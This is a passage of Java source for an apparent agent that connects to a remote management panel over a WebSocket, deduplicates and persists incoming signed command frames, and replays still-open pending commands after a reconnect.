			seen.remove(seen.iterator().next());
		}
		try {
			Files.createDirectories(work);
			Files.writeString(work.resolve("seen"), String.join("\n", seen), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			Log.debug("panel dedup save failed: " + shortMessage(throwable));
		}
	}

	boolean known(String id) {
		return seen.contains(id);
	}

	void writePending(String id, String payload) {
		try {
			Path dir = work.resolve("pending");
			Files.createDirectories(dir);
			Files.writeString(dir.resolve(id + ".json"), payload, StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			Log.debug("panel pending save failed: " + shortMessage(throwable));
		}
	}

	private void clearPending(String id) {
		try {
			Files.deleteIfExists(work.resolve("pending").resolve(id + ".json"));
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/**
	 * After a reconnect, replay only pending commands the panel still lists as
	 * open; completed ones are dropped instead of running twice.
	 */
	private void reconcilePending() {
		Path dir = work.resolve("pending");
		try {
			if (!Files.isDirectory(dir)) {
				return;
			}
			List<Path> files;
			try (var stream = Files.list(dir)) {
				files = stream.filter(path -> path.getFileName().toString().endsWith(".json")).toList();
			}
			if (files.isEmpty()) {
				return;
			}
			java.util.Set<String> open = openTasks();
			if (open == null) {
				return;
			}
			long cutoff = System.currentTimeMillis() - 24L * 60L * 60L * 1_000L;
			for (Path file : files) {
				String name = file.getFileName().toString();
				String id = name.substring(0, name.length() - 5);
				try {
					if (Files.getLastModifiedTime(file).toMillis() < cutoff) {
						Files.deleteIfExists(file);
					} else if (open.contains(id)) {
						redispatch(id, Files.readString(file, StandardCharsets.UTF_8));
					} else {
						Files.deleteIfExists(file);
					}
				} catch (Throwable throwable) {
					Log.debug("panel pending replay failed: " + shortMessage(throwable));
				}
			}
		} catch (Throwable throwable) {
			Log.debug("panel pending scan failed: " + shortMessage(throwable));
		}
	}

	/** Null when the list could not be fetched, so pending files are kept. */
	private java.util.Set<String> openTasks() {
		Identity identity = identity();
		CryptoConfig config = CryptoConfig.load(installDir);
		if (identity == null || config == null) {
			return null;
		}
		try {
			HttpResponse<byte[]> reply = signed(origin(config.panelUrl), "GET", "/api/v1/tasks?limit=32", new byte[0], identity);
			if (reply.statusCode() != 200) {
				return null;
			}
			java.util.Set<String> ids = new java.util.LinkedHashSet<>();
			for (Object raw : Json.list(Json.parseObject(new String(reply.body(), StandardCharsets.UTF_8)).get("tasks"))) {
				String id = Json.str(Json.map(raw), "id", "");
				if (!id.isEmpty()) {
					ids.add(id);
				}
			}
			return ids;
		} catch (Throwable throwable) {
			return null;
		}
	}

	private void redispatch(String fileId, String payload) {
		try {
			Map<String, Object> json = Json.parseObject(payload);
			if (!"cmd".equals(Json.str(json, "type", "")) || !(json.get("args") instanceof Map)) {
				return;
			}
			String taskId = Json.str(json, "task_id", "");
			String frameId = Json.str(json, "id", "");
			String name = Json.str(json, "name", "");
			if (taskId.isEmpty() || name.isEmpty()) {
				return;
			}
			Log.debug("panel replay " + name + " " + taskId);
			markSeen(frameId.isEmpty() ? fileId : frameId);
			long timeoutMs = Math.max(1_000L, Math.min(300_000L, num(json, "timeout_ms", 30_000L)));
			String replyTo = frameId.isEmpty() ? taskId : frameId;
			inFlight.add(replyTo);
			dispatch(name, taskId, Json.map(json.get("args")), replyTo, timeoutMs);
		} catch (Throwable throwable) {
			Log.debug("panel replay parse failed: " + shortMessage(throwable));
		}
	}

	private static String clip(String value, int max) {
		return value.length() <= max ? value : value.substring(0, max);
	}

	private static Long asLong(Object value) {
		return value instanceof Number number ? number.longValue() : null;
	}

	private static long num(Map<String, Object> json, String key, long fallback) {
		Object value = json.get(key);
		return value instanceof Number number ? number.longValue() : fallback;
	}

	private static String shortMessage(Throwable throwable) {
		String message = throwable.getMessage();
		return message == null || message.isEmpty() ? throwable.getClass().getSimpleName() : message;
	}

	private final class Listener implements WebSocket.Listener {
		@Override
		public void onOpen(WebSocket webSocket) {
			webSocket.request(1);
		}

		@Override
		public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
			partial.append(data);
			if (last) {
				String text = partial.toString();
				partial.setLength(0);
				accept(text);
			}
			webSocket.request(1);
			return null;
		}

		@Override
		public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
			ready = false;
			closeCode = statusCode == 1005 || statusCode == 1000 ? 1006 : statusCode;
			CountDownLatch latch = closed;
			if (latch != null) {
				latch.countDown();
			}
			Thread current = thread;
			if (current != null) {
				current.interrupt();
			}
			return null;
		}

		@Override
		public void onError(WebSocket webSocket, Throwable error) {
			Log.debug("panel socket error: " + shortMessage(error));
			ready = false;
			closeCode = 1006;
			CountDownLatch latch = closed;
			if (latch != null) {
				latch.countDown();
			}
			Thread current = thread;
			if (current != null) {
				current.interrupt();
			}
		}
	}

	private void accept(String text) {
		try {
			byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
			if (bytes.length > MAX_FRAME) {
				inbox.put(new Frame(text, Map.of(), 0L, ""));
				return;
			}
			String checked = StrictUtf8(bytes);
			int split = checked.lastIndexOf(",\"sig\":");
			if (split < 0) {
				return;
			}
			String payload = checked.substring(0, split);
			@SuppressWarnings("unchecked")
			Map<String, Object> json = (Map<String, Object>) Json.parse(checked);
			long seq = num(json, "seq", 0L);
			String nonce = Json.str(json, "nonce", "");
			if (seq < 1 || nonce.isEmpty()) {
				return;
			}
			inbox.put(new Frame(payload, json, seq, nonce));
		} catch (Throwable throwable) {
			Log.debug("panel frame parse failed: " + shortMessage(throwable));
		}
	}

	private static String StrictUtf8(byte[] bytes) throws CharacterCodingException {
		return StandardCharsets.UTF_8.newDecoder()
			.onMalformedInput(CodingErrorAction.REPORT)
			.onUnmappableCharacter(CodingErrorAction.REPORT)
			.decode(ByteBuffer.wrap(bytes)).toString();
	}
}
